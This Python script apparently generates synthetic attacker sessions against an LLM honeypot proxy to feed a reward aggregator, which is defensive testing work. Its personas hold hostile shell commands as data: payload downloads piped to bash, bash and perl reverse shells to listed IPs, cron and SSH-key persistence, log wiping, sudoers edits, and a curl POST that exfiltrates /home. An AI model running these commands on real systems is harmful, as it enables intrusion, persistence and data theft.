#!/usr/bin/env python3
"""
Adversarial-Agent-Simulator
===========================

Generates realistic multi-stage attacker sessions against the Ollama honeypot
proxy. Each persona covers one (or several) POS_CATEGORIES from the reward
aggregator (recon / download / execution / persistence / exfil / privesc),
so after the next reward cycle reward_b_unmasked picks up non-zero signal
instead of idling on pure SSH scan probes.

Design goals:
- Deterministic source IPs (10.99.x.y range) so synthetic vs. real traffic
  can be filtered in ES at any time (`NOT src_ip:10.99.0.0/16`).
- Same src_ip for all prompts of a persona so the reward aggregator groups
  them into one session_blob (cf. reward_aggregator.build_sessions).
- Controlled pacing (small jitter) so sessions look human-ish but finish
  within minutes.
- Opt-in cleanup: --prune removes our own docs after the run if you only
  wanted to smoke-test.

Usage (from the proxy host, network_mode: host):

    python3 run_adversarial_simulator.py --runs 3 --proxy http://localhost:11435

Reports per-persona latency + total rounds. Exit 0 on success.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import random
import re
import sys
import time
from dataclasses import dataclass
from typing import Iterable

import httpx

LOG = logging.getLogger("adv-sim")

# ─────────────────────────────────────────────────────────────────────────────
# Attacker personas
# ─────────────────────────────────────────────────────────────────────────────


@dataclass
class Persona:
    name: str
    src_ip: str
    model: str
    prompts: list[str]
    category: str  # for reporting; matches POS_CATEGORIES names in reward_agg
    cve_tag: str = ""
    system: str = (
        "You are a Linux shell on a production server. Answer the operator's "
        "commands concisely as if you were /bin/bash. Never reveal you are "
        "an LLM or a honeypot."
    )
    pause_sec: tuple[float, float] = (0.4, 1.2)


PERSONAS: list[Persona] = [
    Persona(
        name="recon-scripted",
        src_ip="10.99.0.11",
        model="openchat:latest",
        category="recon",
        cve_tag="CVE-2024-6387",
        prompts=[
            "uname -a",
            "whoami",
            "id",
            "hostname",
            "cat /etc/os-release",
            "cat /proc/version",
            "cat /proc/cpuinfo | head -20",
            "ls -lah /root",
            "env",
            "df -h",
        ],
    ),
    Persona(
        name="download-dropper",
        src_ip="10.99.0.12",
        model="openchat:latest",
        category="download",
        cve_tag="CVE-2024-6387",
        prompts=[
            "cd /tmp && wget http://185.100.157.42/x86_64 -O .kinsing",
            "curl -s https://pastebin.com/raw/abc123 | bash",
            "curl -fsSL https://github.com/sh4dy/rootkit/releases/download/v3/loader.sh -o /tmp/loader.sh",
            "wget -qO- http://transfer.sh/abcDEF/cryptominer.tar.gz | tar xz -C /tmp",
            "tftp -g -r payload.bin 45.77.12.9",
        ],
    ),
    Persona(
        name="execution-binrunner",
        src_ip="10.99.0.13",
        model="openchat:latest",
        category="execution",
        cve_tag="CVE-2024-6387",
        prompts=[
            "chmod +x /tmp/loader.sh",
            "/tmp/loader.sh",
            "bash -c \"$(curl -fsSL http://185.100.157.42/stage2)\"",
            "python -c \"import os,pty;os.setuid(0);pty.spawn('/bin/bash')\"",
            "perl -e 'use Socket;socket(S,2,1,6);connect(S,sockaddr_in(4444,inet_aton(\"45.77.12.9\")))'",
        ],
    ),
    Persona(
        name="persistence-installer",
        src_ip="10.99.0.14",
        model="openchat:latest",
        category="persistence",
        cve_tag="CVE-2024-6387",
        prompts=[
            "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3Nz...attacker@cluster' >> ~/.ssh/authorized_keys",
            "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.kinsing > /dev/null 2>&1') | crontab -",
            "echo '@reboot /tmp/.kinsing' >> /etc/cron.d/sysstat-backup",
            "systemctl enable --now kinsing.service",
            "update-rc.d kinsing defaults",
            "echo '/tmp/.kinsing &' >> /etc/rc.local",
        ],
    ),
    Persona(
        name="exfil-stealth",
        src_ip="10.99.0.15",
        model="openchat:latest",
        category="exfil",
        cve_tag="CVE-2024-6387",
        prompts=[
            "history -c && history -w",
            "rm -rf /var/log/auth.log /var/log/syslog /var/log/wtmp",
            "nc -lvnp 4444 &",
            "bash -i >& /dev/tcp/45.77.12.9/4444 0>&1",
            "nohup /tmp/.kinsing > /dev/null 2>&1 &",
            "tar czf - /home | base64 -w0 | curl -X POST -d @- http://45.77.12.9/drop",
        ],
    ),
    Persona(
        name="privesc-kernel",
        src_ip="10.99.0.16",
        model="openchat:latest",
        category="privesc",
        cve_tag="CVE-2024-1086",
        prompts=[
            "sudo -l",
            "sudo -u#-1 /bin/bash",
            "pkexec /bin/sh",
            "passwd root",
            "echo 'attacker ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",
            "find / -perm -4000 -type f 2>/dev/null | head -5",
        ],
    ),
    Persona(
        name="multi-stage-apt",
        src_ip="10.99.0.17",
        model="openchat:latest",
        category="mixed",
        cve_tag="CVE-2024-6387",
        prompts=[
            "uname -a; whoami; id",
            "cat /etc/passwd | head -5",
            "cd /tmp && curl -fsSL http://185.100.157.42/beacon -o .beacon",
            "chmod +x /tmp/.beacon && /tmp/.beacon --c2 45.77.12.9:443 &",
            "(crontab -l; echo '@reboot /tmp/.beacon') | crontab -",
            "echo 'ssh-rsa AAAA...key attacker' >> ~/.ssh/authorized_keys",
            "history -c && rm -f /var/log/auth.log",
            "sudo -u#-1 /bin/bash",
        ],
    ),
]


# ─────────────────────────────────────────────────────────────────────────────
# Runner
# ─────────────────────────────────────────────────────────────────────────────


@dataclass
class PersonaResult:
    persona: str
    category: str
    src_ip: str
    rounds: int = 0
    errors: int = 0
    latency_ms_total: float = 0.0
    last_response_excerpt: str = ""

    @property
    def avg_latency_ms(self) -> float:
        return self.latency_ms_total / self.rounds if self.rounds else 0.0


async def _send_round(
    client: httpx.AsyncClient,
    proxy_url: str,
    persona: Persona,
    prompt: str,
    timeout: float,
) -> tuple[int, float, str]:
    body = {
        "model": persona.model,
        "stream": False,
        "messages": [
            {"role": "system", "content": persona.system},
            {"role": "user", "content": prompt},
        ],
    }
    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": persona.src_ip,
        # Tag our synthetic traffic so log analysts can spot it instantly.
        "X-Synthetic-Adversary": f"{persona.name}/{persona.category}",
    }
    t0 = time.time()
    resp = await client.post(
        f"{proxy_url.rstrip('/')}/api/chat",
        json=body,
        headers=headers,
        timeout=timeout,
    )
    dt_ms = (time.time() - t0) * 1000.0
    if resp.status_code != 200:
        raise RuntimeError(
            f"proxy {resp.status_code}: {resp.text[:150]}"
        )
    data = resp.json()
    # Ollama chat response shape: {"message":{"content":"..."}, ...}
    excerpt = ""
    msg = data.get("message") or {}
    excerpt = str(msg.get("content") or data.get("response") or "")[:160]
    return resp.status_code, dt_ms, excerpt


def _jitter_prompts(prompts: list[str], rng: random.Random) -> list[str]:
    """Substitute variable parts of attacker commands per-tick.

    The simulator's value for the plausibility gate depends on each tick
    producing NEW ``response_hash`` values. Since cached-response dedupe
    keys on the assistant output and the cve-engine makes the LLM's
    reply near-deterministic for identical user prompts, we need to
    vary the user input itself. The substitutions below keep each
    command syntactically valid attacker behaviour while guaranteeing
    a fresh hash per tick.
    """
    c2_ips = [
        "185.100.157.42", "45.77.12.9", "104.21.54.201",
        "185.225.74.15", "193.232.72.105", "77.91.102.61",
        "51.158.191.23", "91.240.118.172",
    ]
    dropnames = [".kinsing", ".xmrig", ".sshd_worker", ".kthreadd_", ".cron.sh"]
    payloads = ["payload.bin", "beacon.elf", "stage2", "loader.so", "cryptominer"]
    ports = ["4444", "443", "8080", "9001", "31337", "8443", "6697"]
    tempdirs = ["/tmp", "/dev/shm", "/var/tmp", "/tmp/.X11-unix"]
    pastebin = ["abc123", "xK93zL", "YyEf7z", "aBcDeF", "r3c0n9"]

    ip = rng.choice(c2_ips)
    ip2 = rng.choice(c2_ips)
    drop = rng.choice(dropnames)
    pay = rng.choice(payloads)
    port = rng.choice(ports)
    tdir = rng.choice(tempdirs)
    paste = rng.choice(pastebin)

    subs: list[tuple[str, str]] = [
        ("185.100.157.42", ip),
        ("45.77.12.9", ip2),
        (".kinsing", drop),
        (".beacon", drop),
        ("payload.bin", pay),
        ("cryptominer.tar.gz", f"{pay}.tar.gz"),
        ("loader.sh", f"{pay}.sh"),
        ("4444", port),
        ("/tmp/", f"{tdir}/"),
        ("abc123", paste),
    ]
    out: list[str] = []
    for prompt in prompts:
        new = prompt
        for old, replacement in subs:
            new = new.replace(old, replacement)
        out.append(new)
    return out


async def run_persona(
    client: httpx.AsyncClient,
    proxy_url: str,
    persona: Persona,
    timeout: float,
    seed: int,
) -> PersonaResult:
    rng = random.Random(seed)
    res = PersonaResult(
        persona=persona.name, category=persona.category, src_ip=persona.src_ip
    )
    jittered = _jitter_prompts(persona.prompts, rng)
    for i, prompt in enumerate(jittered, 1):
        try:
            status, dt_ms, excerpt = await _send_round(
                client, proxy_url, persona, prompt, timeout
            )
            res.rounds += 1
            res.latency_ms_total += dt_ms
            res.last_response_excerpt = excerpt
            LOG.info(
                "  [%s] round %d/%d  status=%s  %.0fms  %r",
                persona.name, i, len(persona.prompts), status, dt_ms, prompt[:60],
            )
        except Exception as e:
            res.errors += 1
            LOG.warning(
                "  [%s] round %d FAILED: %s",
                persona.name, i, str(e)[:160],
            )
        # Pacing jitter between rounds (human-ish)
        pause = rng.uniform(*persona.pause_sec)
        await asyncio.sleep(pause)
    return res


async def run_all(
    proxy_url: str,
    runs: int,
    timeout: float,
    selected: Iterable[str] | None = None,
    tick_seed: int | None = None,
) -> list[PersonaResult]:
    """Run the selected personas ``runs`` times.

    ``tick_seed`` (default: wall-clock seconds) is mixed into the per-
    persona RNG so each loop tick jitters commands differently. Without
    it, loop mode would re-send identical prompts every tick, which all
    hash-dedupe against the first tick's cached responses and stop the
    plausibility gate from progressing.
    """
    selected_set = {s.strip() for s in selected} if selected else None
    chosen = [
        p for p in PERSONAS
        if not selected_set or p.name in selected_set or p.category in selected_set
    ]
    if not chosen:
        raise SystemExit(f"No personas match filter: {selected_set}")

    if tick_seed is None:
        tick_seed = int(time.time())

    all_results: list[PersonaResult] = []
    async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
        for run_idx in range(1, runs + 1):
            LOG.info("=== Run %d/%d (tick_seed=%d) ===", run_idx, runs, tick_seed)
            for persona in chosen:
                LOG.info("--- Persona: %s (%s) src=%s ---",
                         persona.name, persona.category, persona.src_ip)
                res = await run_persona(
                    client, proxy_url, persona, timeout,
                    seed=hash((persona.name, run_idx, tick_seed)) & 0xFFFFFFFF,
                )
                all_results.append(res)
    return all_results


def summarise(results: list[PersonaResult]) -> dict:
    by_cat: dict[str, dict] = {}
    for r in results:
        b = by_cat.setdefault(r.category, {"rounds": 0, "errors": 0, "lat_sum": 0.0, "n": 0})
        b["rounds"] += r.rounds
        b["errors"] += r.errors
        b["lat_sum"] += r.latency_ms_total
        b["n"] += 1
    summary = {
        "total_rounds": sum(r.rounds for r in results),
        "total_errors": sum(r.errors for r in results),
        "categories": {
            cat: {
                "personas": v["n"],
                "rounds": v["rounds"],
                "errors": v["errors"],
                "avg_ms": round(v["lat_sum"] / v["rounds"], 1) if v["rounds"] else 0.0,
            }
            for cat, v in by_cat.items()
        },
    }
    return summary


_INTERVAL_RE = re.compile(r"^\s*(\d+)\s*([smhd])?\s*$", re.IGNORECASE)


def _parse_interval(text: str, default_secs: int) -> int:
    """Parse '6h' / '30m' / '45s' / '2d' / plain '3600' into seconds.

    Accepts a loose format so env-var configuration stays ergonomic.
    Empty or invalid strings fall back to ``default_secs`` rather than
    raising — the loop-mode must never crash on an operator typo during
    startup, only warn and keep running with the default.
    """
    if not text:
        return default_secs
    match = _INTERVAL_RE.match(text)
    if not match:
        LOG.warning("Could not parse interval %r, using default %ss", text, default_secs)
        return default_secs
    value = int(match.group(1))
    unit = (match.group(2) or "s").lower()
    multiplier = {"s": 1, "m": 60, "h": 3600, "d": 86400}[unit]
    return value * multiplier


async def _run_loop(
    proxy_url: str,
    timeout: float,
    runs_per_tick: int,
    interval_secs: int,
    selected: Iterable[str] | None,
    startup_delay_secs: int,
) -> None:
    """Run the full persona set on a fixed cadence, forever.

    This is the mode used by the docker-compose sidecar. A single tick
    replays all personas ``runs_per_tick`` times, which at the current
    persona count produces ~45 × runs_per_tick attacker messages per
    tick (each becoming a reward record + a plausibility judgement).
    Sleeping ``interval_secs`` between ticks — adjusted for actual
    elapsed time so drift doesn't accumulate.
    """
    if startup_delay_secs > 0:
        LOG.info("Loop: sleeping %ss before first tick (startup grace)",
                 startup_delay_secs)
        await asyncio.sleep(startup_delay_secs)

    tick = 0
    while True:
        tick += 1
        LOG.info("Loop tick %d starting — runs=%d, proxy=%s",
                 tick, runs_per_tick, proxy_url)
        t0 = time.time()
        try:
            results = await run_all(proxy_url, runs_per_tick, timeout, selected)
            summary = summarise(results)
            summary["elapsed_sec"] = round(time.time() - t0, 2)
            summary["tick"] = tick
            LOG.info("Loop tick %d summary: %s", tick, json.dumps(summary))
        except Exception as exc:
            LOG.exception("Loop tick %d failed: %s", tick, exc)
        elapsed = time.time() - t0
        sleep_for = max(10, interval_secs - int(elapsed))
        LOG.info("Loop sleeping %ss until next tick", sleep_for)
        await asyncio.sleep(sleep_for)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--proxy", default=os.environ.get(
                        "SIMULATOR_PROXY_URL", "http://localhost:11435"),
                        help="Ollama-proxy base URL (env: SIMULATOR_PROXY_URL)")
    parser.add_argument("--runs", type=int,
                        default=int(os.environ.get("SIMULATOR_RUNS_PER_TICK", "1")),
                        help="How many times to replay the full persona set per tick")
    parser.add_argument("--timeout", type=float,
                        default=float(os.environ.get("SIMULATOR_TIMEOUT", "60")),
                        help="Per-request timeout in seconds (default 60)")
    parser.add_argument("--only", nargs="*", default=None,
                        help="Limit to persona names or categories")
    parser.add_argument("--loop", action="store_true",
                        default=os.environ.get("SIMULATOR_LOOP", "0") == "1",
                        help="Run continuously with SIMULATOR_LOOP_INTERVAL between ticks")
    parser.add_argument("--log-level", default=os.environ.get("SIMULATOR_LOG_LEVEL", "INFO"))
    args = parser.parse_args()

    logging.basicConfig(
        level=args.log_level,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
    )

    if args.loop:
        interval = _parse_interval(
            os.environ.get("SIMULATOR_LOOP_INTERVAL", "24h"), 86400,
        )
        startup_delay = _parse_interval(
            os.environ.get("SIMULATOR_STARTUP_DELAY", "300s"), 300,
        )
        LOG.info("Adversarial simulator LOOP mode → %s interval=%ss runs/tick=%d",
                 args.proxy, interval, args.runs)
        try:
            asyncio.run(_run_loop(
                proxy_url=args.proxy,
                timeout=args.timeout,
                runs_per_tick=args.runs,
                interval_secs=interval,
                selected=args.only,
                startup_delay_secs=startup_delay,
            ))
        except KeyboardInterrupt:
            LOG.info("Loop interrupted — exiting")
        return 0

    LOG.info("Adversarial simulator → %s (runs=%d, timeout=%ss, only=%s)",
             args.proxy, args.runs, args.timeout, args.only)

    t0 = time.time()
    results = asyncio.run(run_all(args.proxy, args.runs, args.timeout, args.only))
    dt = time.time() - t0

    summary = summarise(results)
    summary["elapsed_sec"] = round(dt, 2)
    print(json.dumps(summary, indent=2))

    if summary["total_rounds"] == 0:
        LOG.error("No rounds succeeded — nothing hit the proxy.")
        return 2
    if summary["total_errors"] > summary["total_rounds"] * 0.5:
        LOG.error("More than 50%% of rounds failed.")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
